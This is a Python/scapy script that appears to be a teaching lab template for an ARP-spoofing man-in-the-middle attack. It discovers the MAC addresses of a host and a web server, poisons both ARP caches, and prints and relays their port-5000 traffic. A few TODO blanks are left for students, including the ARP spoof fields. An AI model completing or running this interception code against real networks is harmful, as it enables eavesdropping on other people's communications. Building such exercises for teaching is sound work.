
from scapy.all import ARP, sniff, send, IP, TCP, sendp, Ether, Raw, srp
import socket

SERVER_PORT = 5000
MY_MAC = "02:20:03:11:20:03"
INTf = "eth0"


def get_mac(IP):
    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=IP),
                     timeout=2, iface=INTf, inter=0.1, verbose=False)
    for snd, rcv in ans:
        return rcv.sprintf(r"%Ether.src%")


def perform_spoof(victim_ip, victim_mac, spoofed_ip):
    ethernet_frame = Ether(dst=victim_mac, src=MY_MAC)
    # Craft the ARP packet
    arp_response = ARP(op="is-at",
                       # TODO - populate the correct values below to
                       # correctly perform the arp spoof to the victim.
                       # refer to https://scapy.readthedocs.io/en/latest/api/scapy.layers.l2.html
                       # for information
                       pdst=,
                       hwdst=,
                       psrc=,
                       hwsrc=,
                       hwlen=6,
                       plen=4)

    # Send the ARP spoof packet
    sendp(ethernet_frame / arp_response, verbose=False)


def process_http_packets(pkt):
    if IP in pkt and TCP in pkt:
        if Ether in pkt and pkt[Ether].src == MY_MAC:
            return

        if pkt[TCP].dport == SERVER_PORT or pkt[TCP].sport == SERVER_PORT:
            if Raw in pkt:
                # TODO - Print out the TCP payload, document what protocol
                # is being carried. pkt[Raw] carries a bytes.  pkt[Raw].load will
                # return a bytes. refer to https://docs.python.org/3/library/stdtypes.html#bytes.decode
                # to get an ascii codes string 
                tcp_payload = # add call to decode bytes here 
                print(tcp_payload)
            send(pkt, verbose=False)

        return


def main():
    print("Starting Packet Sniffing")

    # TODO - get the ip of host1 using a function in the socket library (https://docs.python.org/3/library/socket.html)
    host1_ip = socket.<add_function_here>( )
    print("detected host1 ip : %s " % host1_ip)
    host1_mac = get_mac(host1_ip)
    print("detected host1 mac : %s " % host1_mac)

 # TODO - get the ip of web_server using a function in the socket library (https://docs.python.org/3/library/socket.html)
    web_server_ip = socket.<add_function_here>()
    print("detected web_server ip : %s " % web_server_ip)
    web_server_mac = get_mac(web_server_ip)
    print("detected web_server mac : %s " % web_server_mac)

    perform_spoof(host1_ip, host1_mac, web_server_ip)
    perform_spoof(web_server_ip, web_server_mac, host1_ip)
    sniff(prn=process_http_packets, store=False)


if __name__ == "__main__":
    main()
